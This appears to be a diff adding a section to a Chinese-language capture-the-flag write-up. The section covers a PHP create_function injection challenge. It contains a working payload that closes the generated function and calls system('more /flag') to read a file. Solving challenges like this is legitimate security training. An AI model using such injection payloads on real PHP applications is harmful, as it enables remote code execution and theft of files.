@@ -56,6 +56,18 @@ post:sys=echo($flag);&504[SYS.COM=a
 ![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231211154038.png)
 
 
+### 某函数的复仇
+create_function注入
+
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231211163836.png)
+
+```php
+$shaw('',$root);
+
+
+root=}system('more /flag');/*
+shaw=create_function
+```
 # reverse
 
 # pwn
